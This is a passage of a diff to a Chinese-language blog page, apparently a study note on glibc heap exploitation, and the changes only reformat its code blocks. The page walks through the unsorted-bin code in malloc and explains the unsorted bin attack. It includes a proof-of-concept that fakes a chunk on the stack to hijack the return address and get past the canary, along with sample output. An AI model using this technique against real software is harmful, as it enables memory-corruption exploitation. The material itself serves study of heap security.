@@ -154,16 +154,219 @@
 <li><p>在程序malloc时，如果在fastbin，smallbin中找不到对应大小的chunk，就会尝试从unsortedbin中寻找chunk。如果取出的chunk大小刚好满足，就会直接返还给用户，否则就会把这些chunk分别插入到对应的bin中。</p>
 </li>
 </ol>
-<h3 id="unsorted-bin源码"><a href="#unsorted-bin源码" class="headerlink" title="unsorted bin源码"></a>unsorted bin源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c">#源码的第<span class="hljs-number">3470</span>行<span class="hljs-number">-3597</span>行<br>	  <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>		#取链表尾部的chunk记作victim<br>        &#123;<br>          bck = victim-&gt;bk;<br>          #倒数第二个chunk记作bck<br>          #接下来对victim的size位进行检查<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>		  #检查通过，计算victim得到实际chunk的大小<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>              #假如说我们申请的<span class="hljs-built_in">malloc</span>大小属于smallbin的范围，并且last_remainder是<br>              <span class="hljs-meta">#unsortedbin的唯一一个chunk时，优先使用这个chunk。</span><br>              <br>            &#123;<br>              #假若满足条件则对其进行切割和解链操作<br>              <br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>		  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。<br>          #其中unsorted_chunks (av)-&gt;bk = bck;<br>          <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span><br>          #是unsorted bin attack产生的原因，<br>          #一旦我们绕过之前的检查到达这里，<br>          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)<br>          #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。<br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          <span class="hljs-meta">#unsortedbin产生的原因：</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>		  #<br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>    	  #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。<br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* place chunk in bin */</span><br>		  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，<br>          #需要根据其size放入small bin或large bin的链，<br>          #其中在后者实现中存在large bin attack，<br>          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure>
+<h3 id="unsorted-bin源码"><a href="#unsorted-bin源码" class="headerlink" title="unsorted bin源码"></a>unsorted bin源码</h3><pre><code class="hljs c">#源码的第<span class="hljs-number">3470</span>行<span class="hljs-number">-3597</span>行
+	  <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))
+		#取链表尾部的chunk记作victim
+        &#123;
+          bck = victim-&gt;bk;
+          #倒数第二个chunk记作bck
+          #接下来对victim的size位进行检查
+          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)
+              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))
+            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,
+                             chunk2mem (victim), av);
+          size = chunksize (victim);
+		  #检查通过，计算victim得到实际chunk的大小
+          <span class="hljs-comment">/*</span>
+<span class="hljs-comment">             If a small request, try to use last remainder if it is the</span>
+<span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span>
+<span class="hljs-comment">             runs of consecutive small requests. This is the only</span>
+<span class="hljs-comment">             exception to best-fit, and applies only when there is</span>
+<span class="hljs-comment">             no exact fit for a small chunk.</span>
+<span class="hljs-comment">           */</span>
+
+          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;
+              bck == unsorted_chunks (av) &amp;&amp;
+              victim == av-&gt;last_remainder &amp;&amp;
+              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))
+              #假如说我们申请的<span class="hljs-built_in">malloc</span>大小属于smallbin的范围，并且last_remainder是
+              <span class="hljs-meta">#unsortedbin的唯一一个chunk时，优先使用这个chunk。</span>
+              
+            &#123;
+              #假若满足条件则对其进行切割和解链操作
+              
+              <span class="hljs-comment">/* split and reattach remainder */</span>
+              remainder_size = size - nb;
+              remainder = chunk_at_offset (victim, nb);
+              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;
+              av-&gt;last_remainder = remainder;
+              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);
+              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))
+                &#123;
+                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;
+                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;
+                &#125;
+
+              set_head (victim, nb | PREV_INUSE |
+                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));
+              set_head (remainder, remainder_size | PREV_INUSE);
+              set_foot (remainder, remainder_size);
+
+              check_malloced_chunk (av, victim, nb);
+              <span class="hljs-type">void</span> *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              <span class="hljs-keyword">return</span> p;
+            &#125;
+		  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。
+          #其中unsorted_chunks (av)-&gt;bk = bck;
+          <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span>
+          #是unsorted bin attack产生的原因，
+          #一旦我们绕过之前的检查到达这里，
+          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)
+          #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。
+          <span class="hljs-comment">/* remove from unsorted list */</span>
+          <span class="hljs-meta">#unsortedbin产生的原因：</span>
+          unsorted_chunks (av)-&gt;bk = bck;
+          bck-&gt;fd = unsorted_chunks (av);
+		  #
+          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span>
+    	  #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。
+          <span class="hljs-keyword">if</span> (size == nb)
+            &#123;
+              set_inuse_bit_at_offset (victim, size);
+              <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+                victim-&gt;size |= NON_MAIN_ARENA;
+              check_malloced_chunk (av, victim, nb);
+              <span class="hljs-type">void</span> *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              <span class="hljs-keyword">return</span> p;
+            &#125;
+
+          <span class="hljs-comment">/* place chunk in bin */</span>
+		  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，
+          #需要根据其size放入small bin或large bin的链，
+          #其中在后者实现中存在large bin attack，
+          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。
+          <span class="hljs-keyword">if</span> (in_smallbin_range (size))
+            &#123;
+              victim_index = smallbin_index (size);
+              bck = bin_at (av, victim_index);
+              fwd = bck-&gt;fd;
+            &#125;
+          <span class="hljs-keyword">else</span>
+            &#123;
+              victim_index = largebin_index (size);
+              bck = bin_at (av, victim_index);
+              fwd = bck-&gt;fd;
+
+              <span class="hljs-comment">/* maintain large bins in sorted order */</span>
+              <span class="hljs-keyword">if</span> (fwd != bck)
+                &#123;
+                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span>
+                  size |= PREV_INUSE;
+                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span>
+                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);
+                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))
+                    &#123;
+                      fwd = bck;
+                      bck = bck-&gt;bk;
+
+                      victim-&gt;fd_nextsize = fwd-&gt;fd;
+                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
+                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+                    &#125;
+                  <span class="hljs-keyword">else</span>
+                    &#123;
+                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);
+                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)
+                        &#123;
+                          fwd = fwd-&gt;fd_nextsize;
+                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);
+                        &#125;
+
+                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)
+                        <span class="hljs-comment">/* Always insert in the second position.  */</span>
+                        fwd = fwd-&gt;fd;
+                      <span class="hljs-keyword">else</span>
+                        &#123;
+                          victim-&gt;fd_nextsize = fwd;
+                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
+                          fwd-&gt;bk_nextsize = victim;
+                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+                        &#125;
+                      bck = fwd-&gt;bk;
+                    &#125;
+                &#125;
+              <span class="hljs-keyword">else</span>
+                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;
+            &#125;
+
+          mark_bin (av, victim_index);
+          victim-&gt;bk = bck;
+          victim-&gt;fd = fwd;
+          fwd-&gt;bk = victim;
+          bck-&gt;fd = victim;
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span>
+          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)
+            <span class="hljs-keyword">break</span>;
+        &#125;</code></pre>
 <h3 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><ul>
 <li>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</li>
 <li>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值，然后配合fastbin attack使用，达到任意地址写的效果。</li>
 </ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">#如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。<br> #其中unsorted_chunks (av)-&gt;bk = bck;<br> <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span><br> #是unsorted bin attack产生的原因，<br> #一旦我们绕过之前的检查到达这里，<br> #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)<br> #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。<br> <span class="hljs-comment">/* remove from unsorted list */</span><br> <span class="hljs-meta">#unsortedbin产生的原因：</span><br> unsorted_chunks (av)-&gt;bk = bck;<br> bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>
+<pre><code class="hljs c">#如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。
+ #其中unsorted_chunks (av)-&gt;bk = bck;
+ <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span>
+ #是unsorted bin attack产生的原因，
+ #一旦我们绕过之前的检查到达这里，
+ #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)
+ #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。
+ <span class="hljs-comment">/* remove from unsorted list */</span>
+ <span class="hljs-meta">#unsortedbin产生的原因：</span>
+ unsorted_chunks (av)-&gt;bk = bck;
+ bck-&gt;fd = unsorted_chunks (av);</code></pre>
 <h3 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted bin into stack"></a>unsorted bin into stack</h3><p>回顾一下堆块分配的过程，当请求的大小在fastbins和small bins中无法得到满足时，就会进入一个for循环，按照先进先出的方式 遍历unsorted bin，此时如果请求是一个small chunk，且满足要 求，则直接返回；如果不是，则将chunk取出并整理回对应的bins 中，然后进行下一轮循环。</p>
 <h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>下面来看一个例子，该程序试图在栈上伪造一个fake chunk来达 到欺骗malloc的目的，如果利用成功，就会调用函数jackpot()，输 出字符串“Nice jump d00d”。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-type">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>	<span class="hljs-type">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);<br>	<span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>	<span class="hljs-built_in">free</span>(victim);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);<br>	stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>	stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;<br><br>	<span class="hljs-comment">//------------VULNERABILITY-----------</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);<br>	victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>	victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br>	<span class="hljs-comment">//------------------------------------</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br>	<span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);<br><br>	<span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>	<span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>	assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">分配victim chunk<br>分配另一个chunk防止与top chunk合并<br>释放victim chunk:<span class="hljs-number">0x1ef8420</span>时，它将被插入unsorted bin中<br>在栈上创建一个fake chunk用于下一次分配和指向任意可写地址的bk指针，模拟一个可以覆盖victim-&gt;size和victim-&gt;bk指针的漏洞<br>Size应该与下一个返回fake_chunk的请求大小不同，需要通过检查 <span class="hljs-number">2</span>*SIZE_SZ (&gt; <span class="hljs-number">16</span> on x64) &amp;&amp; &lt; av-&gt;system_mem\n<br>现在，下一个<span class="hljs-built_in">malloc</span>将返回我们的假块的区域:<span class="hljs-number">0x7ffd5a615840</span><br><span class="hljs-built_in">malloc</span> (<span class="hljs-number">0x100</span>): <span class="hljs-number">0x7ffd5a615840</span><br>Nice jump d00d<br></code></pre></td></tr></table></figure>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
+	<span class="hljs-type">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);
+	<span class="hljs-type">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);
+	<span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);
+	<span class="hljs-built_in">free</span>(victim);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);
+	stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;
